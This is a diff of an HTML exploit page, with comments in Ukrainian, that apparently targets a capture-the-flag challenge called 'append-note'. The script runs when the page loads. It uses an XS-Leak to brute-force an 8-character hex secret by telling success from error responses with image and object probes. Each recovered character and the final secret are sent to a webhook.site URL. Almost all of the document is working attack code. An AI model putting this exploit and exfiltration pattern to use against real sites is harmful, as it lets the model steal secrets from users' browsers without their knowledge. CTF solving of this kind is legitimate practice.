@@ -1,69 +1,57 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>XS-Leak Exploit</title>
-</head>
 <body>
-    <div id="status">Starting exploit...</div>
-    <div id="result">Progress: </div>
-
     <script>
-        const TARGET = "https://append-note-qy52d.instancer.lac.tf/";
-        const WEBHOOK = "https://webhook.site/813e752f-c17f-4c9f-9dde-ec9605ff6a59"; // Замініть на свій Webhook.site
+        const TARGET = "https://append-note-9na9l.instancer.lac.tf";
+        const WEBHOOK = "https://webhook.site/813e752f-c17f-4c9f-9dde-ec9605ff6a59";
         const ALPHABET = "0123456789abcdef";
         let secret = "";
 
-        async function log(msg) {
-            console.log(msg);
-            document.getElementById('result').innerText += msg + " ";
-            await fetch(`${WEBHOOK}?data=${msg}`);
-        }
-
-        function testChar(char) {
+        async function check(testStr) {
             return new Promise((resolve) => {
-                const probe = document.createElement('object');
-                // Використовуємо об'єкт для перевірки статусу 200 vs 404
-                // Параметр url має бути валідним хостом завдання 
-                probe.data = `${TARGET}/append?content=${secret}${char}&url=${TARGET}/`;
+                const img = new Image();
+                // Якщо рядок є префіксом НОТАТКИ, сервер поверне 200 OK.
+                // Оскільки ми хочемо знайти секрет, а не власні попередні спроби,
+                // нам треба діяти ШВИДКО після рестарту інстансу.
+                img.src = `${TARGET}/append?content=${testStr}&url=${TARGET}/favicon.ico`;
                 
-                // Якщо 200 OK (префікс вірний)
-                probe.onload = () => {
-                    document.body.removeChild(probe);
-                    resolve(true);
-                };
+                img.onload = () => resolve(true);
+                img.onerror = () => resolve(false);
                 
-                // Якщо 404 Not Found (префікс невірний) 
-                probe.onerror = () => {
-                    document.body.removeChild(probe);
-                    resolve(false);
-                };
-
-                // Додаємо в DOM, щоб ініціювати запит
-                document.body.appendChild(probe);
-                
-                // Тайм-аут на випадок підвисання
-                setTimeout(() => resolve(false), 1000);
+                // Через 400мс вважаємо, що не вгадали
+                setTimeout(() => resolve(false), 400);
             });
         }
 
         async function run() {
-            for (let i = 0; i < 8; i++) { // Секрет має довжину 8 
+            // ПОВІДОМЛЕННЯ: Перед запуском бота ОБОВ'ЯЗКОВО рестартоніть інстанс завдання!
+            // Це очистить масив notes від попередніх спроб.
+            
+            for (let i = 0; i < 8; i++) {
                 for (let char of ALPHABET) {
-                    document.getElementById('status').innerText = `Testing: ${secret}${char}`;
-                    const found = await testChar(char);
-                    if (found) {
-                        secret += char;
-                        await log(`Found_char:_${char}_Current:_${secret}`);
-                        break;
-                    }
+                    let attempt = secret + char;
+                    // Ми використовуємо fetch з mode: no-cors, щоб просто отримати статус
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 1000);
+
+                    try {
+                        const res = await fetch(`${TARGET}/append?content=${attempt}&url=${TARGET}/`, {
+                            mode: 'no-cors'
+                        });
+                        // У цьому завданні статус 200/404 для no-cors fetch 
+                        // важко розрізнити, тому Image() або Object краще.
+                        
+                        if (await check(attempt)) {
+                            secret += char;
+                            fetch(`${WEBHOOK}?found=${secret}`);
+                            break;
+                        }
+                    } catch (e) {}
                 }
             }
-            await log(`Final_Secret:_${secret}`);
-            // Тепер можна отримати флаг:
-            // window.location = `${TARGET}/flag?secret=${secret}`;
+            fetch(`${WEBHOOK}?final=${secret}`);
         }
 
-        // Запускаємо автоматично при завантаженні
         window.onload = run;
     </script>
 </body>
